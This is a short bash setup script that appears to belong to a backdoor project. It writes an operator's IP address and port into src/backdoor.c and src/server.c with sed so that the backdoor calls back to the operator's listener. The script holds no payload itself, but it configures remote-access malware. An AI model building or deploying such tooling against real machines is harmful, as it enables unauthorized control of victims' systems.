#!/bin/bash
# CMAKE - Configuration Script

# Get IP address
IP=$1
if [ -z "$IP" ]; then
    echo "[-] No IP supplied"
    exit 1
fi

# Get Port
PORT=$2
if [ -z "$PORT" ]; then
    echo "[-] No Port supplied"
    exit 1
fi

# Cross-platform sed in-place edit
sedi() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' "$@"
    else
        sed -i "$@"
    fi
}

# Replace IP in backdoor.c (the server listens on 0.0.0.0, so only backdoor needs the IP)
sedi "s/192\.168\.[0-9]*\.[0-9]*/$IP/g" src/backdoor.c

# Replace Port in both files
sedi "s/htons([0-9]*)/htons($PORT)/g" src/server.c
sedi "s/ServerPort = [0-9]*/ServerPort = $PORT/g" src/backdoor.c

# Done message
echo "[+] Configured: IP=$IP PORT=$PORT"